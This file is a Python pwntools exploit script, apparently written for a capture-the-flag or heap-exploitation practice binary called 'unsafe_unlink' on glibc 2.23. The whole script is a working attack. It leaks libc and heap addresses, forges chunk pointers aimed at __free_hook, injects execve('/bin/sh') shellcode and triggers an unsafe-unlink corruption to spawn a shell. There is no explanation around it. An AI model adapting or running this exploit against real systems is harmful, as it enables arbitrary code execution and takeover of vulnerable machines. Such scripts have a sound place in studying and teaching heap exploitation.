#!/usr/bin/env python3
from pwn import *


context.log_level = 'debug'
context.binary = elf = ELF('./unsafe_unlink', checksec=False)

libc = ELF('../.glibc/glibc_2.23_unsafe-unlink/libc.so.6', checksec=False)
#libc = elf.libc

gs = """
b *main
b *main+265
b *main+382
b *main+656
b *main+717
b *main+787
"""

index = 0

def info(mes):
    return log.info(mes)

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

def malloc(size):
    global index
    
    io.send(b'1')
    io.sendafter(b'size: ', str(size).encode())
    io.recvuntil(b'> ')
    
    index += 1
    return index - 1

def edit(index, data):
    io.send(b'2')
    io.sendafter(b'index: ', str(index).encode())
    io.sendafter(b'data: ', data)
    io.recvuntil(b'> ')

def free(index):
    io.send(b'3')
    io.sendafter(b'index: ', str(index).encode())
    io.recvuntil(b'> ')

def exit():
    io.send(b'4')


io = start()
#io.timeout = 0.1
io.recvuntil(b'puts() @ ')
puts = int(io.recvline(), 16)
io.recvuntil(b'heap @ ')
heap = int(io.recvline(), 16)
libc.address = puts - libc.sym['puts']
info("puts: " + hex(puts))
info("libc base: " + hex(libc.address))
info("heap: " + hex(heap))
io.recvuntil(b'> ')



chunk_a = malloc(0x88)
chunk_b = malloc(0x88)

fd_pointer = libc.sym['__free_hook'] - 0x18
bk_pointer = heap + 0x20
shellcode = asm("jmp shellcode;" + "nop;"*0x30 + "shellcode:" + shellcraft.execve("/bin/sh"))
zero_null = p8(0)*(0x88 - len(shellcode) - 8*3)
prev_size = p64(0x90)
size_B = p64(0x90)

payload = p64(fd_pointer) 
payload += p64(bk_pointer) 
payload += shellcode 
payload += zero_null
payload += prev_size
payload += size_B

edit(chunk_a, payload)

free(chunk_b)
#free(chunk_a)

io.interactive()
